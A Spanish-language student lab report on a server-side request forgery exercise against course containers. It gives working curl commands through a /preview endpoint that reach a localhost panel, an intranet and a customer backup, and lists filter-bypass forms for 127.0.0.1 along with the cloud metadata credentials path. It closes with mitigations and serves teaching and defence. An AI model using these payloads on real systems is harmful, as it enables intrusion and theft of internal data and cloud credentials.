# Informe — Lab Extra: SSRF (Server-Side Request Forgery)

**Grupo:** 02

**Integrantes:**

- Romero Jimena Soledad (legajo 15377) — @Jimena-Romero
- Milanesio Hebe Del Lourdes (legajo 15343) — @hebemilanesio1
- Toranzo Juan Cruz (legajo 15308) — @JuanToranzo
- Torres Damaris (legajo 14563) — @damaris412

**Declaración de uso de IA:** usamos Claude (Anthropic), en la interfaz de chat, para: (1) ayudar a estructurar y redactar este informe a partir de las salidas reales que corrimos nosotros, y (2) resolver dudas sobre bypasses de filtros (representación decimal de IP, DNS rebinding) para responder la P4. Toda la cadena de explotación se ejecutó contra los contenedores de la cátedra (`cyberlab-ssrf-web` y `cyberlab-ssrf-intra`) desde la consola del atacante; las flags salen de las respuestas HTTP reales del `/preview`, no de leer el código del target. Verificamos cada flag con `./ctf submit extra` y confirmamos las 3 con `./ctf status extra` (3/3).

---

## 1. Cadena de explotación

El portal público (`http://phantomcorp/`) ofrece una herramienta de
previsualización de URLs para empleados: `/preview?url=...`. El servidor
fetchea **él mismo** la URL que le pasamos y nos devuelve el contenido, sin
ninguna validación del destino. Eso es un SSRF (CWE-918): usamos al servidor
como proxy hacia lugares que nosotros no alcanzamos.

Primero comprobamos la premisa del lab: desde la consola del atacante
(`labnet`) **no** se llega a la intranet (`internalnet`):

```
$ curl -s --max-time 3 http://phantomcorp-intra/
[exit=6]     # "Could not resolve host": no hay ruta ni DNS a la intranet
```

El servidor público, en cambio, sí está en las dos redes. Esa es la pieza que
rompe la segmentación: **el server alcanza lo que nosotros no, y nos presta su
posición de red** a través del `/preview`.

### R1 — Panel interno en localhost

- **Descubrimiento de la funcionalidad vulnerable:** en la home del portal
  (`curl -s http://phantomcorp/`) aparece el formulario que apunta a `/preview`,
  con el texto de IT: *"La previsualización la genera el servidor"*. Eso es el
  cartel de "fetch server-side".
- **Cómo encontramos el puerto del panel:** el `/preview` también nos sirve como
  **oráculo de escaneo** de los puertos de `127.0.0.1` del propio server. Un
  puerto cerrado devuelve un error de conexión; uno abierto devuelve contenido.
  Probando puertos internos típicos de paneles de admin, el 9000 respondió.

```
# puerto CERRADO (9999): el error delata que ahí no escucha nadie
$ curl -s "http://phantomcorp/preview?url=http://127.0.0.1:9999/"
No pude traer http://127.0.0.1:9999/: <urlopen error [Errno 111] Connection refused>

# puerto ABIERTO (9000): responde el panel que "solo escucha en localhost"
$ curl -s "http://phantomcorp/preview?url=http://127.0.0.1:9000/"
<h3>Previsualizacion de http://127.0.0.1:9000/</h3><hr><!doctype html><html><body style="font-family:monospace">
<h2>PhantomCorp — Panel interno (solo localhost)</h2>
<p>Si estás viendo esto desde afuera, algo salió mal.</p>
<p>Deploy key: <b>FLAG{ssrf_localhost_panel_interno}</b></p>
</body></html>
```

**Flag R1:** `FLAG{ssrf_localhost_panel_interno}`. El panel estaba bindeado a
`127.0.0.1:9000` "por seguridad" — pero para el SSRF, localhost *es* el server.

### R2 — Intranet en la red interna

- **Cómo dedujimos el nombre del host interno:** el enunciado confirma que
  existe una intranet, y los hosts internos de PhantomCorp siguen el patrón de
  nombres que ya vimos en otros labs (`phantomcorp`, `phantomcorp-intra`).
  Pedimos al server que fetchee ese nombre, que él sí resuelve en su red interna.

```
$ curl -s "http://phantomcorp/preview?url=http://phantomcorp-intra/"
<h3>Previsualizacion de http://phantomcorp-intra/</h3><hr><!doctype html><html><body style="font-family:sans-serif">
<h1>Intranet PhantomCorp</h1>
<p><b>USO INTERNO.</b> Si la estás viendo desde afuera, avisá a Seguridad.</p>
<p>Host: <b>FLAG{ssrf_intranet_descubierta}</b></p>
<ul>
  <li><a href="/backups/clientes.json">backup de clientes (temporal, borrar!)</a></li>
  <li><a href="/salud">estado del servicio</a></li>
</ul>
</body></html>
```

**Flag R2:** `FLAG{ssrf_intranet_descubierta}`. La misma home de la intranet nos
dejó el mapa de sus rutas, incluido el backup.

### R3 — Exfiltración del backup

- **Recorrido:** la home de la intranet (R2) linkeaba a
  `/backups/clientes.json` ("temporal, borrar!"). Lo pedimos por el mismo SSRF.

```
$ curl -s "http://phantomcorp/preview?url=http://phantomcorp-intra/backups/clientes.json"
<h3>Previsualizacion de http://phantomcorp-intra/backups/clientes.json</h3><hr>{
  "_aviso": "backup temporal pre-migracion. NO deberia ser accesible.",
  "clientes": [
    {"id": 1, "empresa": "Aconcagua SRL", "cuit": "30-70998877-1"},
    {"id": 2, "empresa": "Comechingones SA", "cuit": "30-71554433-6"}
  ],
  "integridad": "FLAG{ssrf_backup_clientes}"
}
```

**Flag R3:** `FLAG{ssrf_backup_clientes}`.
**Datos sensibles que acompañaban a la flag:** un backup de clientes con razón
social y **CUIT** de dos empresas (Aconcagua SRL — 30-70998877-1; Comechingones
SA — 30-71554433-6). Es información que nunca debió cruzar el perímetro.

## 2. Evidencia de progreso

```
  ╭────────────────────────────────────────────────────────────╮
  │                   PROGRESO · LAB extra                    │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     El server fetchea por vos: panel interno en localhost
   ✓  R2     Descubrir la intranet en la red interna
   ✓  R3     Exfiltrar datos sensibles a traves del SSRF

  ██████████████████████████████  3/3 (100%)

[ OK ] ¡Lab extra COMPLETO! Ponete las pilas con la próxima unidad.
```

Salidas crudas de respaldo en `evidencia/salidas/` y la lista de comandos en
`evidencia/comandos.txt`.

## 3. Preguntas de análisis

**P1 — ¿Por qué "la intranet no es alcanzable desde afuera" dejó de ser
cierta?**
Por el mapa de red: el atacante está en `labnet`, la intranet solo en
`internalnet`, y entre ellas **no hay ruta directa** (lo confirmamos con el
`curl` que da exit 6). Pero `phantomcorp` (el server público) está en **ambas
redes** a la vez. El componente que la hizo alcanzable es el `/preview`: una
funcionalidad que fetchea URLs arbitrarias desde un host que sí tiene un pie en
la red interna. La segmentación seguía intacta a nivel de red; lo que falló fue
confiar en que "estar adentro" era suficiente control. El SSRF convierte al
server en un puente entre las dos redes.

**P2 — El oráculo de escaneo de puertos.**
En R1 distinguimos puerto cerrado de abierto por el **mensaje de error** del
`/preview`: un puerto sin servicio devuelve `urlopen error [Errno 111]
Connection refused` (502), mientras que un puerto abierto devuelve `200` con el
cuerpo HTML del servicio. Esa diferencia observable (error de conexión vs.
contenido, y también la diferencia de *tiempo*: un puerto filtrado por firewall
colgaría hasta el timeout de 5 s, uno cerrado corta al instante) es exactamente
un **oráculo**: una respuesta binaria que, repetida sobre muchos puertos, nos
deja mapear qué escucha en `127.0.0.1` del server sin tener ninguna conexión
directa a esa máquina. El SSRF no solo lee: también enumera.

**P3 — Hallazgo profesional (R3).**
- **Activo afectado:** backup de clientes de PhantomCorp
  (`phantomcorp-intra:/backups/clientes.json`), con razón social y CUIT de
  clientes (dato personal / fiscal).
- **Vector:** SSRF (CWE-918) en `GET /preview?url=` del portal público. El
  parámetro `url` se fetchea server-side sin allowlist ni bloqueo de destinos
  internos, permitiendo alcanzar la red `internalnet`.
- **Impacto:** exfiltración de datos de clientes a través del perímetro por un
  usuario no autenticado y sin acceso a la red interna. Exposición de
  información personal/fiscal (riesgo legal, Ley 25.326 de Protección de Datos
  Personales) y pérdida de confidencialidad.
- **Evidencia:** respuesta HTTP 200 del `/preview` con el JSON del backup
  (`evidencia/salidas/r3-backup.txt`), incluyendo los CUIT y el marcador de
  integridad `FLAG{ssrf_backup_clientes}`.

**P4 — Tres mitigaciones para `/preview`, de mejor a peor.**
1. **Rediseño: no fetchear destinos internos — egress restringido + allowlist
   de destinos.** Que el componente que hace el fetch salga por una red/segmento
   sin ruta a `127.0.0.1`, `169.254.169.254` ni a `internalnet` (bloqueo a nivel
   de red/firewall de egreso), y que solo permita un conjunto explícito de hosts
   externos autorizados. *Limitación:* una allowlist es mantenimiento constante y
   puede ser inútil si uno de los hosts permitidos hace a su vez de proxy
   (redirecciones).
2. **Validación robusta: resolver el host, verificar que la IP resultante no sea
   privada/loopback/link-local, y recién ahí conectar a esa misma IP (sin volver
   a resolver).** *Limitación:* hay que cubrir el **DNS rebinding** —si validás
   el DNS y después reconectás, el atacante puede cambiar la respuesta DNS entre
   la validación y la conexión (TOCTOU). Por eso hay que "pinnear" la IP validada
   y usarla en la conexión, no re-resolver.
3. **Filtrado de strings (la peor).** Bloquear que la URL contenga `localhost` o
   `127.0.0.1`. *Limitación:* se evade trivialmente. `http://2130706433/` es
   `127.0.0.1` en **decimal**; `http://127.1/`, `http://0.0.0.0/`,
   `http://[::1]/`, o un dominio controlado por el atacante que **resuelve a
   127.0.0.1** pasan todos el filtro. Filtrar strings ataca la forma de la URL,
   no el destino real; por eso no alcanza.

**P5 — Conexión con la nube: el metadata service.**
`169.254.169.254` es la dirección *link-local* del **Instance Metadata Service**
que exponen AWS/GCP/Azure a cada máquina virtual. Devuelve metadatos de la
instancia y —lo grave— **credenciales temporales del rol IAM** asociado. Un SSRF
en una app cloud es mucho más grave que en este lab porque con una sola request
(`http://169.254.169.254/latest/meta-data/iam/security-credentials/<rol>`) el
atacante obtiene claves válidas de la nube y, con ellas, acceso a buckets, bases
y servicios de toda la cuenta (es exactamente lo de Capital One, 2019: 100
millones de registros). Acá el SSRF leyó un backup; en la nube roba las llaves
del reino. La mitigación específica es **IMDSv2**, que exige un token obtenido
por `PUT` previo, cortando los SSRF simples de solo-GET.

## 4. Conclusión

Resumen ejecutivo para el CTO de PhantomCorp: *la intranet "aislada" quedó
expuesta sin que nadie tocara su red. La herramienta de previsualización de URLs
del portal público pide recursos en nombre del servidor, y como el servidor sí
está en la red interna, un usuario anónimo pudo leer el panel de administración
que "solo escuchaba en localhost", descubrir la intranet y exfiltrar un backup
de clientes con sus CUIT. La causa de fondo no es un bug exótico: es confiar en
la ubicación de red como control de acceso. La corrección urgente es validar el
destino del `/preview` (allowlist + bloqueo de IPs internas con IP pinning) y
restringir el egreso de ese componente; el backup de clientes debe borrarse de
la intranet y tratarse como incidente de datos personales.*
